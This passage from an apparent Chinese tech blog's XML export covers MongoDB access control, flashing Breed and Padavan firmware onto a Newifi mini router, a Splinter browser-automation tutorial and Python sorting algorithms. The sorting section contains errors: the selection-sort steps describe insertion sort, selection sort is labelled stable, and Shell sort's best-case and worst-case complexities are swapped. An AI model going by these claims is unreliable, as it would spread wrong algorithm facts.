&#123;</span><br><span class="line">    &quot;user&quot; : &quot;admin&quot;,</span><br><span class="line">    &quot;roles&quot; : [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;role&quot; : &quot;userAdminAnyDatabase&quot;,</span><br><span class="line">            &quot;db&quot; : &quot;admin&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="在配置文件中开启权限验证"><a href="#在配置文件中开启权限验证" class="headerlink" title="在配置文件中开启权限验证"></a>在配置文件中开启权限验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/mongod.conf</span><br></pre></td></tr></table></figure>
<p>在配置文件中加入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">security:</span><br><span class="line">  authorization: enabled</span><br></pre></td></tr></table></figure>
<h3 id="重启-MongoDB-服务"><a href="#重启-MongoDB-服务" class="headerlink" title="重启 MongoDB 服务"></a>重启 MongoDB 服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo service mongod restart</span><br></pre></td></tr></table></figure>
<h3 id="验证权限是否生效"><a href="#验证权限是否生效" class="headerlink" title="验证权限是否生效"></a>验证权限是否生效</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mongo</span><br><span class="line">MongoDB shell version v3.6.2</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017</span><br><span class="line">MongoDB server version: 3.6.2</span><br><span class="line">&gt; show dbs</span><br><span class="line">2018-02-01T14:39:46.976+0800 E QUERY    [thread1] Error: listDatabases failed:&#123;</span><br><span class="line">	&quot;ok&quot; : 0,</span><br><span class="line">	&quot;errmsg&quot; : &quot;not authorized on admin to execute command &#123; listDatabases: 1.0, $db: \&quot;admin\&quot; &#125;&quot;,</span><br><span class="line">	&quot;code&quot; : 13,</span><br><span class="line">	&quot;codeName&quot; : &quot;Unauthorized&quot;</span><br><span class="line">&#125; :</span><br><span class="line">_getErrorWithCode@src/mongo/shell/utils.js:25:13</span><br><span class="line">Mongo.prototype.getDBs@src/mongo/shell/mongo.js:65:1</span><br><span class="line">shellHelper.show@src/mongo/shell/utils.js:813:19</span><br><span class="line">shellHelper@src/mongo/shell/utils.js:703:15</span><br><span class="line">@(shellhelp2):1:1</span><br><span class="line">&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line">&gt; db.auth(&#x27;admin&#x27;, &#x27;mongodb123456&#x27;)</span><br><span class="line">1</span><br><span class="line">&gt; show dbs</span><br><span class="line">admin   0.000GB</span><br><span class="line">config  0.000GB</span><br><span class="line">local   0.000GB</span><br></pre></td></tr></table></figure>
<h3 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; use spiders</span><br><span class="line">switched to db spiders</span><br><span class="line">&gt; db.createUser(</span><br><span class="line">... &#123;</span><br><span class="line">...    user: &quot;spiders&quot;,</span><br><span class="line">...    pwd: &quot;spiders@2018&quot;,</span><br><span class="line">...    roles: [&#123; role: &quot;readWrite&quot;, db: &quot;spiders&quot; &#125;]</span><br><span class="line">... &#125;</span><br><span class="line">... )</span><br><span class="line">Successfully added user: &#123;</span><br><span class="line">	&quot;user&quot; : &quot;spiders&quot;,</span><br><span class="line">	&quot;roles&quot; : [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;role&quot; : &quot;readWrite&quot;,</span><br><span class="line">			&quot;db&quot; : &quot;spiders&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功添加一个普通用户：</p>
<ul>
<li>用户名：spiders</li>
<li>密码：spiders@2018</li>
<li>权限：读写 spiders 数据库</li>
</ul>
<h3 id="内建角色"><a href="#内建角色" class="headerlink" title="内建角色"></a>内建角色</h3><p>1.角色介绍</p>
<ul>
<li>数据库用户角色：read、readWrite</li>
<li>数据库管理角色：dbAdmin、dbOwner、userAdmin</li>
<li>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager</li>
<li>备份恢复角色：backup、restore</li>
<li>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</li>
<li>超级用户角色：root // 这里还有几个角色间接或直接提供了系统超级用户的访问（dbOwner 、userAdmin、userAdminAnyDatabase）</li>
<li>内部角色：__system</li>
</ul>
<p>2.角色说明  </p>
<ul>
<li>Read：允许用户读取指定数据库</li>
<li>readWrite：允许用户读写指定数据库</li>
<li>dbAdmin：允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问 system.profile</li>
<li>userAdmin：允许用户向 system.users 集合写入，可以找指定数据库里创建、删除和管理用户</li>
<li>clusterAdmin：只在 admin 数据库中可用，赋予用户所有分片和复制集相关函数的管理权限</li>
<li>readAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的读权限</li>
<li>readWriteAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的读写权限</li>
<li>userAdminAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的 userAdmin 权限</li>
<li>dbAdminAnyDatabase：只在 admin 数据库中可用，赋予用户所有数据库的 dbAdmin 权限</li>
<li>root：只在 admin 数据库中可用。超级账号，超级权限</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://docs.mongodb.com/manual/tutorial/getting-started/">MongoDB 官方文档</a></li>
<li><a href="https://www.jianshu.com/p/a4e94bb8a052">如何对MongoDB 3.2.7进行用户权限管理配置</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Newifi mini 刷 breed 不死和老毛子 Padavan 固件</title>
    <url>/2019/06/28/Newifi-mini-%E5%88%B7-breed-%E4%B8%8D%E6%AD%BB%E5%92%8C%E8%80%81%E6%AF%9B%E5%AD%90-Padavan-%E5%9B%BA%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>闲鱼 50 元包邮入手了一个 Newifi mini 路由器，因为没有 Windows 电脑一直没有刷老毛子系统，记录一下刷机过程。</p>
<span id="more"></span>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>首先要根据路由器型号选择相应的 Breed 版本和路由器系统版本。<br>Newifi mini 对应的版本如下：</p>
<ul>
<li>Breed：<a href="https://breed.hackpascal.net/breed-mt7620-lenovo-y1.bin">breed-mt7620-lenovo-y1.bin</a></li>
<li>Padavan 固件：<a href="http://opt.cn2qq.com/padavan/">RT-AC54U-GPIO-11-newifimini-128M_xxxxx.trx</a></li>
</ul>
<h2 id="刷入-Breed"><a href="#刷入-Breed" class="headerlink" title="刷入 Breed"></a>刷入 Breed</h2><ol>
<li>路由器插上电源，用网线将路由器和电脑连接在一起（Newifi 的任意一个网口均可）；</li>
<li>在「网络和共享中心」（Windows）或者「系统偏好设置 👉🏻 网络」（Mac），找到对应的网络，设置其 IPv4 地址为 192.168.1.2，子网掩码为 255.255.255.0；</li>
<li>设置好后，断开路由器电源，按住 Reset 按键不松，连上电源，Reset 继续按住 5 秒以上。如果看到路由器的部分或全部LED连闪4次，或 ping 通即表明进入 Web 刷机模式；</li>
<li>这时候电脑访问 192.168.1.1 即可进入路由器自带恢复模式；</li>
<li>选择文件 <code>breed-mt7620-lenovo-y1.bin</code>，点击恢复按钮；</li>
<li>等待升级完成</li>
</ol>
<h2 id="刷入-Padavan-固件"><a href="#刷入-Padavan-固件" class="headerlink" title="刷入 Padavan 固件"></a>刷入 Padavan 固件</h2><p>在刷好 Breed 之后，我们用 刷 Breed 步骤中的 1~4 步，进入 Breed 进行固件的升级：</p>
<ol>
<li><p>进入 Breed 之后，选择左侧侧的「固件更新」；</p>
</li>
<li><p>将右侧「固件」旁的选择框打勾，并选择上面下载好的 <code>RT-AC54U-GPIO-11-newifimini-128M_xxxxx.trx</code> 文件，将「自动重启」打勾，点击「上传」按钮</p>
</li>
<li><p>确认更新；</p>
</li>
<li><p>等待完成即可。</p>
</li>
</ol>
<p>默认配置</p>
<ul>
<li>旧固件网关：192.168.1.1</li>
<li>新固件网关：192.168.123.1</li>
<li>管理页面：192.168.123.1</li>
<li>管理账号：admin/admin</li>
<li>wifi:1234567890</li>
</ul>
<p>将之前手动设置的网络 IP，用同样的方式改为自动获取。访问 <code>192.168.123.1</code> 进入管理页面，账号密码 <code>admin</code>。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.right.com.cn/forum/thread-161906-1-1.html">AR/QCA/MTK Breed，功能强大的多线程 Bootloader</a></li>
<li><a href="https://www.right.com.cn/forum/thread-161324-1-1.html">改华硕[N14U N54U]5G 2G的7620老毛子Padavan固件(私人云储存 aria2 QOS)</a></li>
<li><a href="https://blog.lbinin.com/interest/Newifi-Padavan.html#%E8%83%8C%E6%99%AF">Newifi Mini 刷机教程</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Padavan</tag>
      </tags>
  </entry>
  <entry>
    <title>Python + Splinter 实现浏览器自动化操作入门指南</title>
    <url>/2017/10/17/Python-Splinter-%E5%AE%9E%E7%8E%B0%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E6%93%8D%E4%BD%9C%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Splinter 是用 Python 开发的一个开源web自动化测试的工具集。 它可以帮你自动化浏览器的行为，比如浏览 URLs 并和页面进行交互。</p>
<span id="more"></span>

<h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>从终端运行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install splinter</span><br></pre></td></tr></table></figure>
<h3 id="安装相应的浏览器驱动"><a href="#安装相应的浏览器驱动" class="headerlink" title="安装相应的浏览器驱动"></a>安装相应的浏览器驱动</h3><p>Chrome浏览器驱动：<a href="https://sites.google.com/a/chromium.org/chromedriver/downloads">https://sites.google.com/a/chromium.org/chromedriver/downloads</a><br>Firefox浏览器驱动：<a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a><br>根据相应的浏览器下载对应的驱动版本，并将驱动所在的路径加入环境变量。</p>
<h3 id="创建一个-Browser-实例"><a href="#创建一个-Browser-实例" class="headerlink" title="创建一个 Browser 实例"></a>创建一个 Browser 实例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> splinter <span class="keyword">import</span> Browser</span><br><span class="line">browser = Browser()</span><br><span class="line"><span class="comment"># 指定driver为chrome浏览器</span></span><br><span class="line"><span class="comment"># browser = Browser(driver_name=&#x27;chrome&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><strong>提示</strong>: 如果你不为 Browser 指定 driver, 那么会默认使用 firefox。</p>
<h3 id="访问百度搜索页面"><a href="#访问百度搜索页面" class="headerlink" title="访问百度搜索页面"></a>访问百度搜索页面</h3><p>使用 <code>browser.visit</code> 方法可访问任意网站. 让我们访问一下百度搜索页面:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.visit(<span class="string">&#x27;http://baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="输入搜索关键词"><a href="#输入搜索关键词" class="headerlink" title="输入搜索关键词"></a>输入搜索关键词</h3><p>页面加载完毕后，你能进行一系列的交互，比如点击，输入框填充字段，选择单选按钮和复选框。让我们在百度搜索框中填充 <code>splinter - python acceptance testing for web applications</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.fill(<span class="string">&#x27;wd&#x27;</span>, <span class="string">&#x27;splinter - python acceptance testing for web applications&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="点击搜索按钮"><a href="#点击搜索按钮" class="headerlink" title="点击搜索按钮"></a>点击搜索按钮</h3><p>告诉 Splinter 哪一个按钮需要点击。这个按钮 - 或任意其他元素 - 可以通过它的css, xpath, id, tag 或 name来识别。  </p>
<p>通过以下操作找到百度搜索按钮：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">button = browser.find_by_xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>提示一下，这个 xpath 语法所在的按钮 会在百度搜索页面的源码中被找到。  </p>
<p>找到按钮后，我们就可以进行点击操作:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">button.click()</span><br></pre></td></tr></table></figure>

<p>提示: 以上展示的两步可以结合为一行代码，如下所示:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.find_by_xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
<h3 id="查看-Splinter-官方网站是否在搜索结果中"><a href="#查看-Splinter-官方网站是否在搜索结果中" class="headerlink" title="查看 Splinter 官方网站是否在搜索结果中"></a>查看 Splinter 官方网站是否在搜索结果中</h3><p>点击搜索按钮后，你可以通过以下步骤检测 Splinter 官方网站是否在搜索结果中。  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> browser.is_text_present(<span class="string">&#x27;splinter.readthedocs&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Yes, found it! :)&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;No, didn&#x27;t find it :(&quot;</span></span><br></pre></td></tr></table></figure>

<p>在这个小例子中, 我们只是打印出了结果. 当写测试的时候，你需要使用断言。</p>
<h3 id="关闭浏览器"><a href="#关闭浏览器" class="headerlink" title="关闭浏览器"></a>关闭浏览器</h3><p>结束测试后，我们需要使用 browser.quit 关闭浏览器:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>最后完整的代码如下所示:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> splinter <span class="keyword">import</span> Browser</span><br><span class="line"></span><br><span class="line">browser = Browser()</span><br><span class="line">browser.visit(<span class="string">&#x27;http://baidu.com&#x27;</span>)</span><br><span class="line">browser.fill(<span class="string">&#x27;wd&#x27;</span>, <span class="string">&#x27;splinter - python acceptance testing for web applications&#x27;</span>)</span><br><span class="line">button = browser.find_by_xpath(<span class="string">&#x27;//input[@type=&quot;submit&quot;]&#x27;</span>).click()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> browser.is_text_present(<span class="string">&#x27;splinter.readthedocs&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Yes, the official website was found!&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;No, it wasn&#x27;t found... We need to improve our SEO techniques&quot;</span></span><br><span class="line"></span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
<h1 id="翻译计划"><a href="#翻译计划" class="headerlink" title="翻译计划"></a>翻译计划</h1><p>上述的介绍是来自于我近期翻译的 Splinter 文档中快速上手部分，非常感谢<a href="http://redredleaf.me/">一叶染秋</a>加入翻译计划。我们目前只是翻译了一小部分，还有很多没有翻译，如果你想加入翻译计划可以给 Github 上的<a href="https://github.com/Wooden-Robot/splinter-docs-zh_CN">Splinter 中文文档项目</a>提交PR，翻译前请先私信我你想翻译的章节，避免大家重复翻译。如果有翻译不对或者不好的地方也欢迎大家多多提建议。</p>
<h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p>最早的时候大家都会使用 Phantomjs 来实现headless，但是多多少少会有一些不足的地方。现在 Chrome 和 Firefox 都已经提供了相应的 headless 模式，而且 Splinter 也已经集成。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> splinter <span class="keyword">import</span> Browser</span><br><span class="line"></span><br><span class="line">browser = Browser(driver_name=<span class="string">&#x27;chrome&#x27;</span>, headless=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># browser = Browser(driver_name=&#x27;firefox&#x27;, headless=True)</span></span><br></pre></td></tr></table></figure>
<p>通过一个简单的参数即可启用 headless 模式，赶快去试试吧！（Ps: 我为这个功能做了一点微小的工作）</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://splinter.readthedocs.io/en/latest/">Splinter 官方文档</a></li>
<li><a href="http://splinter-docs-zh-cn.readthedocs.io/zh/latest/">Splinter 中文文档</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Splinter</tag>
      </tags>
  </entry>
  <entry>
    <title>常见排序算法 Python 实现及舞蹈展示</title>
    <url>/2018/11/09/Python-sort/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整理了一下常见排序算法 Python 的实现和动图及舞蹈视频对算法运行过程的可视化展示。</p>
<hr>
<span id="more"></span>

<h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol>
<li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li>
<li>对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。</li>
<li>针对所有的元素重复以上的步骤，除了最后一个。</li>
<li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。<h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3></li>
</ol>
<table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(N^2)</td>
<td>O(N)</td>
<td>O(N^2)</td>
<td>O(1)</td>
<td>稳定</td>
</tr>
</tbody></table>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bubble_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="comment"># 首先得到每个循环需要比较的次数，第一次从0位置开始需要比较 len(alist) - 1 次</span></span><br><span class="line">    <span class="keyword">for</span> passnum <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 相邻两个位置不断比较，如果左边的数大于右边就交换位置</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(passnum):</span><br><span class="line">            <span class="keyword">if</span> alist[i] &gt; alist[i+<span class="number">1</span>]:</span><br><span class="line">                alist[i], alist[i+<span class="number">1</span>] = alist[i+<span class="number">1</span>], alist[i]</span><br><span class="line">    <span class="keyword">return</span> alist</span><br></pre></td></tr></table></figure>
<h3 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h3><p><img src="https://upload.wikimedia.org/wikipedia/commons/3/37/Bubble_sort_animation.gif"></p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM1OTA3Mg==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。步骤如下：</p>
<ol>
<li>从第一个元素开始，该元素可以认为已经被排序；</li>
<li>取出下一个元素，在已经排序的元素序列中从后向前扫描;</li>
<li>如果该元素（已排序）大于新元素，将该元素移到下一位置;</li>
<li>重复步骤3，直到找到已排序的元素小于或者等于新元素的位置;</li>
<li>将新元素插入到该位置后;</li>
<li>重复步骤2~5。</li>
</ol>
<h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(N^2)</td>
<td>O(N^2)</td>
<td>O(N^2)</td>
<td>O(1)</td>
<td>稳定</td>
</tr>
</tbody></table>
<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">select_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist) - <span class="number">1</span>):</span><br><span class="line">        min_index = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(alist)):</span><br><span class="line">            <span class="keyword">if</span> alist[j] &lt; alist[min_index]:</span><br><span class="line">                min_index = j</span><br><span class="line"></span><br><span class="line">        alist[i], alist[min_index] = alist[min_index], alist[i]</span><br><span class="line">    <span class="keyword">return</span> alist</span><br></pre></td></tr></table></figure>

<h3 id="可视化-1"><a href="#可视化-1" class="headerlink" title="可视化"></a>可视化</h3><p><img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Selection_sort_animation.gif"></p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM2NDg4OA==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="工作原理-2"><a href="#工作原理-2" class="headerlink" title="工作原理"></a>工作原理</h3><p>通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。</p>
<h3 id="复杂度-2"><a href="#复杂度-2" class="headerlink" title="复杂度"></a>复杂度</h3><table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(N^2)</td>
<td>O(N)</td>
<td>O(N^2)</td>
<td>O(1)</td>
<td>稳定</td>
</tr>
</tbody></table>
<h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">insertion_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="comment"># 从索引为 1 的值开始从后向前扫描</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(alist)):</span><br><span class="line">        current_value = alist[i]</span><br><span class="line">        position = i</span><br><span class="line">        <span class="comment"># 如果前一个数大于当前值则将前一个数向右移动一位，直到找到前一个数小于当前值得位置，将该位置的值设为当前值</span></span><br><span class="line">        <span class="keyword">while</span> position &gt; <span class="number">0</span> <span class="keyword">and</span> alist[position - <span class="number">1</span>] &gt; current_value:</span><br><span class="line">            alist[position] = alist[position - <span class="number">1</span>]</span><br><span class="line">            position -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        alist[position] = current_value</span><br><span class="line">    <span class="keyword">return</span> alist</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="可视化-2"><a href="#可视化-2" class="headerlink" title="可视化"></a>可视化</h3><p><img src="https://upload.wikimedia.org/wikipedia/commons/2/25/Insertion_sort_animation.gif"></p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM2MDA2NA==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><h3 id="工作原理-3"><a href="#工作原理-3" class="headerlink" title="工作原理"></a>工作原理</h3><p>希尔排序，也称递减增量排序算法，是插入排序的一种更高效的改进版本。希尔排序是非稳定排序算法。</p>
<p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p>
<ol>
<li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率；</li>
<li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位。</li>
</ol>
<h3 id="复杂度-3"><a href="#复杂度-3" class="headerlink" title="复杂度"></a>复杂度</h3><table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(NlogN)</td>
<td>O(N^2)</td>
<td>-</td>
<td>O(1)</td>
<td>不稳定</td>
</tr>
</tbody></table>
<h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shell_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    sub_list_count = <span class="built_in">len</span>(alist) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> sub_list_count &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> start_position <span class="keyword">in</span> <span class="built_in">range</span>(sub_list_count):</span><br><span class="line">           alist = gap_insertion_sort(alist, start_position, sub_list_count)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;After increments of size&#x27;</span>, sub_list_count, <span class="string">&#x27;The list is&#x27;</span>, alist)</span><br><span class="line">        sub_list_count = sub_list_count // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> alist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gap_insertion_sort</span>(<span class="params">alist, start, gap</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start + gap, <span class="built_in">len</span>(alist), gap):</span><br><span class="line">        current_value = alist[i]</span><br><span class="line">        position = i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> position &gt;= gap <span class="keyword">and</span> alist[position - gap] &gt; current_value:</span><br><span class="line">            alist[position] = alist[position - gap]</span><br><span class="line">            position = position - gap</span><br><span class="line"></span><br><span class="line">        alist[position] = current_value</span><br><span class="line">    <span class="keyword">return</span> alist</span><br></pre></td></tr></table></figure>
<h3 id="可视化-3"><a href="#可视化-3" class="headerlink" title="可视化"></a>可视化</h3><p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d8/Sorting_shellsort_anim.gif"></p>
<iframe height=498 width=510 src='http://player.youku.com/embed/XMzcyNTM2MTA0MA==' frameborder=0 'allowfullscreen'></iframe>

<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="工作原理-4"><a href="#工作原理-4" class="headerlink" title="工作原理"></a>工作原理</h3><p>快速排序使用分治法（Divide and conquer）策略来把一个序列（list）分为两个子序列（sub-lists）。步骤如下：</p>
<ol>
<li>从数列中挑出一个元素，称为“基准”（pivot）；</li>
<li>重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（相同的数可以到任何一边）。在这个分割结束之后，该基准就处于数列的中间位置。这个称为分割（partition）操作；</li>
<li>递归地（recursively）把小于基准值元素的子数列和大于基准值元素的子数列排序。</li>
</ol>
<p>递归到最底部时，数列的大小是零或一，也就是已经排序好了。这个算法一定会结束，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p>
<h3 id="复杂度-4"><a href="#复杂度-4" class="headerlink" title="复杂度"></a>复杂度</h3><table>
<thead>
<tr>
<th>最坏时间复杂度</th>
<th>最优时间复杂度</th>
<th>平均时间复杂度</th>
<th>额外空间复杂度</th>
<th>稳定性</th>
</tr>
</thead>
<tbody><tr>
<td>O(N^2)</td>
<td>O(NlogN)</td>
<td>O(NlogN)</td>
<td>O(logN)</td>
<td>不稳定</td>
</tr>
</tbody></table>
<h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><p>快速排序首先选择一个值，该值称为 枢轴值。虽然有很多不同的方法来选择枢轴值，我们将使用列表中的第一项。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">quick_sort</span>(<span class="params">alist</span>):</span><br><span class="line">    quick_sort_helper(alist, <span class="number">0</span>, <span class="built_in">len</span>(alist) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_sort_helper</span>(<span class="params">alist, first, last</span>):</span><br><span class="line">    <span class="keyword">if</span> first &lt; last:</span><br><span class="line">        splitpoint = partition(alist, first, last)</span><br><span class="line">        alist = quick_sort_helper(alist, first, splitpoint - <span class="number">1</span>)</span><br><span class="line">        alist = quick_sort_helper(alist, splitpoint + <span class="number">1</span>, last)</span><br><span class="line">    <span class="keyword">return</span> alist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span 